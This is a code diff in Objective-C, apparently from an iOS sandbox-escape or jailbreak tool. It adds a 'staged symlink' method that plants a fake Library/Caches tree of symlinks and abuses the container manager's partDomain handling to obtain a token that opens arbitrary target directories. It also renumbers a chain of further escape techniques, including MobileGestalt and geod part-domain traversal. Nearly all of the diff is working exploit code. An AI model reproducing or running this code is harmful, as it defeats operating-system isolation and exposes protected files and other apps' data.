@@ -449,6 +449,72 @@ static int64_t bq_escape_class2_subpath(NSString *target, NSString **linkOut) {
     return last;
 }
 
+// Class 2 staged symlink: put a tiny fake tree inside the app's own
+// Library/Caches, then use partDomain so MCM appends "Library/Caches" behind a
+// symlink that resolves to the target. No Library move and no app group.
+static int64_t bq_escape_class2_stage(NSString *target, NSString **linkOut) {
+    NSString *home = NSHomeDirectory();
+    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
+    if (!home.length || !bid.length || !g.set_domain) return -6;
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *caches = [[home stringByAppendingPathComponent:@"Library"] stringByAppendingPathComponent:@"Caches"];
+    [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
+    NSString *tag = [NSString stringWithFormat:@".bq_stage_%d", getpid()];
+    NSString *stage = [caches stringByAppendingPathComponent:tag];
+    NSString *link = [caches stringByAppendingPathComponent:
+                      [NSString stringWithFormat:@".bq_slink_%d", getpid()]];
+    NSString *stageLib = [stage stringByAppendingPathComponent:@"Library"];
+    NSString *stageCaches = [stageLib stringByAppendingPathComponent:@"Caches"];
+
+    [fm removeItemAtPath:stage error:nil];
+    unlink(link.fileSystemRepresentation);
+    if (![fm createDirectoryAtPath:stageLib withIntermediateDirectories:YES attributes:nil error:nil]) return -2;
+    if (symlink(target.fileSystemRepresentation, stageCaches.fileSystemRepresentation) != 0) {
+        [fm removeItemAtPath:stage error:nil];
+        return -2;
+    }
+    if (symlink(stage.fileSystemRepresentation, link.fileSystemRepresentation) != 0) {
+        unlink(stageCaches.fileSystemRepresentation);
+        [fm removeItemAtPath:stage error:nil];
+        return -2;
+    }
+
+    NSArray *domains = @[
+        [@"Library/Caches/" stringByAppendingString:link.lastPathComponent],
+        [@"Caches/" stringByAppendingString:link.lastPathComponent],
+        link.lastPathComponent,
+    ];
+    int64_t last = -1;
+    for (NSString *domain in domains) {
+        NSString *path = nil;
+        int64_t h = bq_query_escape(2, bid, NO, 3, domain, 0x8100000000ULL,
+                                    [@"class2-stage-" stringByAppendingString:domain], &path);
+        if (h >= 0) {
+            DIR *d = opendir(target.fileSystemRepresentation);
+            if (!d) {
+                BQLog(@"class2-stage: token did not open target (%@)", path ?: @"(null)");
+                if (g.release) g.release(h);
+                last = -5;
+                continue;
+            }
+            closedir(d);
+            unlink(link.fileSystemRepresentation);
+            unlink(stageCaches.fileSystemRepresentation);
+            rmdir(stageLib.fileSystemRepresentation);
+            rmdir(stage.fileSystemRepresentation);
+            if (linkOut) *linkOut = target;
+            BQLog(@"escape: using class2 stage (%@) path=%@", domain, path ?: @"(null)");
+            return h;
+        }
+        last = h;
+    }
+    unlink(link.fileSystemRepresentation);
+    unlink(stageCaches.fileSystemRepresentation);
+    rmdir(stageLib.fileSystemRepresentation);
+    rmdir(stage.fileSystemRepresentation);
+    return last;
+}
+
 static int64_t bq_escape_class2_parent(NSString *target, NSString **linkOut) {
     NSString *home = NSHomeDirectory();
     NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
@@ -590,7 +656,20 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 3. Class 2 symlink inside the existing Library/Caches. This is safe and
+    // 3. Class 2 staged symlink: a fake Library/Caches tree inside the app's
+    //    Caches, resolved through a partDomain symlink. Safe and no app group.
+    {
+        NSString *link = nil;
+        int64_t h = bq_escape_class2_stage(target, &link);
+        if (h >= 0) {
+            if (linkOut) *linkOut = link ?: target;
+            BQLog(@"escape: using class2 stage");
+            return h;
+        }
+        last = h;
+    }
+
+    // 4. Class 2 symlink inside the existing Library/Caches. This is safe and
     //    needs no app group; it only works if MCM follows a relative symlink in
     //    partDomain without rejecting the resolved target.
     {
@@ -604,7 +683,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 4. Class 2 parent-directory symlink. No app group needed: move the app's
+    // 5. Class 2 parent-directory symlink. No app group needed: move the app's
     //    Library aside, create Library/Caches -> target, query the app's own
     //    container (class 2), then restore Library. Off by default: some builds
     //    kill the process for moving Library, so this is opt-in from Settings.
@@ -623,7 +702,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         BQLog(@"class2-parent disabled (enable in Settings if there is no app group)");
     }
 
-    // 5. Class 13 direct MobileGestalt query (some 27.0.x builds).
+    // 6. Class 13 direct MobileGestalt query (some 27.0.x builds).
     if ([target isEqualToString:kMGCaches]) {
         NSString *p = nil;
         int64_t h = bq_query_escape(13, kMGGroup, YES, 3, @"", 0x8100000000ULL,
@@ -636,7 +715,7 @@ int64_t BQEscape(NSString *target, NSString **linkOut) {
         last = h;
     }
 
-    // 6. Class 12 geod part-domain traversal (older builds).
+    // 7. Class 12 geod part-domain traversal (older builds).
     if (target.isAbsolutePath) {
         NSString *dom = [bq_dots(12) stringByAppendingString:target];
         NSString *p = nil;
